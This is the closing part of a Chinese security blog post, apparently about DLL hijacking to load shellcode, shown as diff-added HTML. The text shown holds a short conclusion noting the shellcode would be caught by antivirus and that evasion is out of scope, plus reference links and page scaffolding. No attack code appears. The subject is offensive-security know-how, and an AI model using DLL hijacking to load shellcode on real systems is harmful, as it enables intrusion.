+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不过暂时应该还是没有办法过杀软的，因为这个shellcode肯定是会被检测到的，不过免杀不在本篇考虑的范畴内。还有就是为什么加载shellcode的DLL不可以上线，暂时不知道为什么。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649737096&amp;idx=1&amp;sn=582fb5d65201dc7b6d47b249d485a6c0&amp;chksm=888cf7e7bffb7ef125b76b2a5658fa12d3600ebe8e631d17129a4f08a5a19eb9b3f39307dc89&amp;scene=21">https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649737096&amp;idx=1&amp;sn=582fb5d65201dc7b6d47b249d485a6c0&amp;chksm=888cf7e7bffb7ef125b76b2a5658fa12d3600ebe8e631d17129a4f08a5a19eb9b3f39307dc89&amp;scene=21</a></p>
+<p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/20">https://security.tencent.com/index.php/blog/msg/20</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mengyafei43/article/details/10340689">https://blog.csdn.net/mengyafei43/article/details/10340689</a></p>
+<p><a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1660033739400079723&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1660033739400079723&amp;wfr=spider&amp;for=pc</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/DLL%E5%8A%AB%E6%8C%81/">DLL劫持</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/DLL%E5%8A%AB%E6%8C%81/">DLL劫持</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/">
+                        <span class="hidden-mobile">恶意代码分析实战-实验13</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
